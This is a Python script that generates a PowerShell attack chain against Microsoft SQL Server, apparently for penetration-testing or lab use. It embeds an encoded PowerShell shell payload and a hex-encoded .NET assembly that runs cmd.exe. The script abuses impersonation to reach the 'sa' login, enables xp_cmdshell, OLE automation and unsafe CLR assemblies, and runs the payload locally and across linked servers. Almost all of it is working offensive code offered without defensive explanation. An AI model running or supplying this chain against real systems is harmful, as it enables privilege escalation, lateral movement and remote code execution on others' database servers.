#!/bin/env python3
import ak
from generate_tool_loader import ToolLoader

tl = ToolLoader("metdll")

b64_shell = tl.ps_b64() 
sql_assembly = "0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010300000000000000000000000000e00002210b0108000008000000060000000000000e270000002000000040000000004000002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000c02600004b000000004000000003000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e7465787400000014070000002000000008000000020000000000000000000000000000200000602e72737263000000000300000040000000040000000a0000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000000e00000000000000000000000000004000004200000000000000000000000000000000f02600000000000048000000020005001c2100009805000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e02281600000a2a13300600b500000001000011730200000a0a066f0300000a72010000706f0400000a066f0300000a7239000070028c04000001280500000a6f0600000a066f0300000a166f0700000a066f0300000a176f0800000a066f0900000a26178d07000001251672490000701f0c20a00f00006a730a00000aa2730b00000a0b280c00000a076f0d00000a0716066f0e00000a6f0f00000a6f1000000a6f1100000a280c00000a076f1200000a280c00000a6f1300000a066f1400000a066f1500000a2a00000042534a4201000100000000000c00000076342e302e33303331390000000005006c000000c8010000237e0000340200007802000023537472696e677300000000ac040000580000002355530004050000100000002347554944000000140500008400000023426c6f620000000000000002000010471502000900000000fa013300160000010000000e00000002000000020000000100000017000000020000000100000001000000030000000000610201000000000006001b0031000a005e0066000a00870066000600a500af000e00c400cb0006001c01310006002a01310006003601400106004c0131000600600131000e008c0199010e00a30199010e00b801cb000e001a0238020000000001000000000001000100010010000a00000035000100010050200000000086184c0001000100582000000000960002024c00010000000100520009004c00010011004c000100110079000a00190098000f002900d20014001900d9000f001900e7001a001900fb001a00110016011f0039004c00230031004c002b00490057013200510068013700110079013d006100ae0142006900bf0142003100c80146005100d20137005100e10101001100f00101001100fc01010069004c00010071004c0001002e00bb00590040000b00050052000480000000000000000000000000000000000a02000004000000000000000000000078004001000000000400000000000000000000007800cb000000000004000000000000000000000078005802000000000000003c4d6f64756c653e0053746f72656450726f636564757265730053716c50726f636564757265417474726962757465004d6963726f736f66742e53716c5365727665722e536572766572002e63746f720065786563436f6d6d616e640050726f636573730053797374656d2e446961676e6f7374696373006765745f5374617274496e666f0050726f636573735374617274496e666f007365745f46696c654e616d650053716c537472696e670053797374656d2e446174612e53716c547970657300537472696e670053797374656d00466f726d6174007365745f417267756d656e7473007365745f5573655368656c6c45786563757465007365745f52656469726563745374616e646172644f75747075740053746172740053716c446174615265636f72640053716c4d657461446174610053716c4462547970650053797374656d2e446174610053716c436f6e74657874006765745f506970650053716c506970650053656e64526573756c74735374617274006765745f5374616e646172644f75747075740053747265616d5265616465720053797374656d2e494f00546578745265616465720052656164546f456e64004f626a65637400546f537472696e6700536574537472696e670053656e64526573756c7473526f770053656e64526573756c7473456e640057616974466f724578697400436c6f736500636d64457865630077696e5f73716c617373656d626c790052756e74696d65436f6d7061746962696c6974794174747269627574650053797374656d2e52756e74696d652e436f6d70696c65725365727669636573006d73636f726c69620077696e5f73716c617373656d626c792e646c6c00000000003743003a005c00570069006e0064006f00770073005c00530079007300740065006d00330032005c0063006d0064002e00650078006500000f20002f00430020007b0030007d00000d6f007500740070007500740000008cd6d0c8ec575c4790459d7ff0ec36c700032000010401000000042000120d042001010e0500020e0e1c042001010203200002072003010e11210a062001011d121d0400001229052001011219042000122d0320000e05200201080e050001011111060702120912191e01000100540216577261704e6f6e457863657074696f6e5468726f77730108b77a5c561934e089000000000000000000000000000000e82600000000000000000000fe260000002000000000000000000000000000000000000000000000f02600000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000a80200000000000000000000a80234000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000000000000000000000000000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000007f00b00408020000010053007400720069006e006700460069006c00650049006e0066006f000000e401000001003000300037006600300034006200300000001c000200010043006f006d006d0065006e007400730000002000000024000200010043006f006d00700061006e0079004e0061006d00650000000000200000002c0002000100460069006c0065004400650073006300720069007000740069006f006e000000000020000000300008000100460069006c006500560065007200730069006f006e000000000030002e0030002e0030002e003000000040001000010049006e007400650072006e0061006c004e0061006d0065000000770069006e005f00730071006c0061007300730065006d0062006c00790000002800020001004c006500670061006c0043006f0070007900720069006700680074000000200000002c00020001004c006500670061006c00540072006100640065006d00610072006b00730000000000200000005000140001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000770069006e005f00730071006c0061007300730065006d0062006c0079002e0064006c006c000000240002000100500072006f0064007500630074004e0061006d0065000000000020000000280002000100500072006f006400750063007400560065007200730069006f006e0000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000103700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"

o = f"""
$c="powershell -enc {b64_shell}"

Write-Output "Running as user:"
$q="SELECT USER_NAME()";Get-SQLQuery -Query "$q"
$q="SELECT SYSTEM_USER";Get-SQLQuery -Query "$q"

Write-Output "Impersonateable users"
$q="SELECT distinct b.name FROM master.sys.server_permissions a INNER JOIN master.sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";Get-SQLQuery -Query "$q"

Write-Output "Checking if user public"
$q="SELECT IS_SRVROLEMEMBER('public')";get-sqlquery -verbose -query "$q"

Write-Output "Checking if user a sysadmin"
$q="SELECT IS_SRVROLEMEMBER('sysadmin')";get-sqlquery -verbose -query "$q"

Write-Output "Attempting to escalate to sa user"
$q="EXECUTE AS LOGIN = 'sa'";Get-SQLQuery -Verbose -Query "$q"

Write-Output "List of server links"
Get-SqlServerLinkCrawl -Query "exec sp_linkedservers;"

Write-Output "Trying XP_CMDSHELL on local server"
get-SqlQuery -verbose -query "exec master.dbo.xp_cmdshell '$c'"

Write-Output "Trying XP_CMDSHELL on all links with AT syntax"
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT `"$_`";EXECUTE ('master.dbo.xp_cmdshell ''$c''') AT `"$_`"" }}

Write-Output "Trying XP_CMDSHELL on all links with OpenQuery syntax"
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "select 1 from openquery(`"$_`", 'select 1; EXEC sp_configure ''xp_cmdshell'',1,RECONFIGURE')"  }}
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "select 1 from openquery(`"$_`", 'select 1; EXEC xp_cmdshell   ''$c'' ')"  }}

Write-Output "Trying sp_OACreate locally"
$q="EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c `"$c`"';";get-sqlquery -query "$q"

Write-Output "Trying sp_OACreate w/ OpenQuery on links"
$a="select 1; EXEC sp_configure ''show advanced options'',1,RECONFIGURE;"
$a+="EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;"
$a+="DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c `"$c`"''"
$r = Get-SqlServerLinkCrawl -Query "SELECT USER_NAME";$r.links | Foreach-Object {{ Get-SQLQuery -Verbose -Query "select 1 from openquery(`"$_`", '$a')"  }}

Write-Output "Trying custom assemblies locally"
$q="use msdb;EXECUTE AS USER='dbo';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security',0;RECONFIGURE;";get-sqlquery -verbose -query "$q"
$q="CREATE ASSEMBLY my_assembly FROM {sql_assembly} WITH PERMISSION_SET = UNSAFE;";get-sqlquery -verbose -query "$q"
$q="CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";get-sqlquery -verbose -query "$q"
$q="EXEC cmdExec '$c'";get-sqlquery -verbose -query "$q"

Write-Output "Trying custom assemblies on linked instances"

"""

ak.write_file("output_powerupsql.txt", o)
